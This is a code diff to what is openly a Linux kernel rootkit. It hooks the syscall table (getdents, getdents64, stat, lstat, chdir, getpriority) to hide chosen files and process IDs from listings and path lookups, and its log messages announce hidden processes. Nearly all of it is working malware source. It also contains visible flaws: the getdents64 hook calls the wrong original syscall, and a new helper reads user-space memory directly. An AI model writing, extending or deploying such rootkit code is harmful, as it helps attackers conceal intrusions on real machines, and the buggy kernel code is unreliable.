@@ -52,19 +52,15 @@ unsigned long *syscall_table = NULL;
 #define args6 args5, regs->r9
 #define args(n) args##n
 #define DECL_DO_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), const struct pt_regs* regs
-#define DECL_DO_HOOK_RET(n_args, ret_type, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret
 #define DECL_ORIG_HOOK(n_args, ...) const struct pt_regs* regs
 #define ARGS_ORIG(n_args, ...) regs
 #define ARGS_DO_HOOK(n_args, ...) args(n_args), regs
-#define ARGS_DO_HOOK_RET(n_args, ...) args(n_args), ret
 
 #else //normal args, kernel < 4.17
 #define DECL_DO_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), const struct pt_regs* regs
-#define DECL_DO_HOOK_RET(n_args, ret_type, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret
 #define DECL_ORIG_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__)
 #define ARGS_ORIG(n_args, ...) __MAP(n_args, __SC_ARGS, __VA_ARGS__)
 #define ARGS_DO_HOOK(n_args, ...) ARGS_ORIG(n_args, __VA_ARGS__), NULL //regs is null, as these kernel versions do not use it
-#define ARGS_DO_HOOK_RET(n_args, ...) ARGS_ORIG(n_args, __VA_ARGS__), ret
 #endif
 
 #define hook_define(n_args, ret_type, syscall_name, ...)                                               \
@@ -84,21 +80,23 @@ unsigned long *syscall_table = NULL;
 
 // END HOOK DEFINING MACROS -----------------------------------------
 
-hook_define_ret(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
-hook_define_ret(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count);
+hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
+hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count);
 hook_define(2, long, stat, const char __user*, pathname, struct __old_kernel_stat __user*, statbuf);
 hook_define(2, long, lstat, const char __user*, pathname, struct __old_kernel_stat __user*, statbuf);
 hook_define(1, long, chdir, const char __user*, pathname);
 hook_define(2, long, getpriority, int, which, int, who);
 
-asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, long ret) {
+asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, const struct pt_regs* regs) {
 	int buff_offset, deleted_size;
 	struct linux_dirent* currnt;
 	struct list_files_node* node_file;
 	struct list_pids_node* node_pid;
 	bool del;
 	char pid_str[8];
-	//printk(KERN_INFO "ROOTKIT: sysgetdents init\n");
+	long ret;
+
+	ret = sys_getdents_orig(ARGS_ORIG(3, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count));
 
 	buff_offset = 0;
 	while (buff_offset < ret){
@@ -136,13 +134,16 @@ asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user
 }
 
 // COPY PASTE: YOU CAN DO IT BETTER B****
-asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count, long ret) {
+asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count, const struct pt_regs* regs) {
 	int buff_offset, deleted_size;
 	struct linux_dirent64* currnt;
 	struct list_files_node* node_file;
 	struct list_pids_node* node_pid;
 	bool del;
 	char pid_str[8];
+	long ret;
+
+	ret = sys_getdents_orig(ARGS_ORIG(3, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count));
 
 	buff_offset = 0;
 	while (buff_offset < ret){
@@ -179,17 +180,50 @@ asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __
 	return ret;
 }
 
+const char* my_basename(const char __user* pathname){
+	// proc/ /proc proc proc/pepe /proc/ TESTING
+	int len = strlen(pathname);
+	const char __user* basename = pathname;
+	for (int i = 0; i < len-1; i++)
+		if (pathname[i] == '/')
+			basename = pathname+i+1;
+
+	len = strlen(basename);
+	char* result = kmalloc(len+1, GFP_KERNEL);
+	memcpy(result, basename, len+1);
+	if (result[len-1] == '/') //delete / on last character
+		result[len-1] = '\x00';
+
+	return result;
+
+	/*
+	char* tmp = kmalloc(len+1, GFP_KERNEL);
+	memcpy(tmp, pathname, len+1);
+	char* last_barra = strrchr(tmp, '/');
+	if (last_barra == NULL)
+		return tmp;
+	if (last_barra == tmp+len-1){ //last pos
+		tmp[len-1] = '\x00';
+		last_barra = strrchr(tmp, '/');
+		if (last_barra == NULL)
+			return tmp;
+	}
+	return last_barra+1;*/
+}
+
 int check_pids_in_pathname(const char __user *pathname, const char* syscall_caller){
 	struct list_pids_node* node;
 	char pid_str[8];
 	const char* filename;
 	list_for_each_entry(node, &list_pids, list){
 		snprintf(pid_str, sizeof(pid_str), "%d", node->pid);
-		filename = kbasename(pathname); //WARNING: I think it won't work if pathname ends with '/'
+		filename = my_basename(pathname);
 		if (strcmp(pid_str, filename) == 0){
+			kfree(filename);
 			printk(KERN_INFO "ROOTKIT: Hidden process %s from call to %s\n", pid_str, syscall_caller);
 			return -1;
 		}
+		kfree(filename);
 	}
 	return 0;
 }
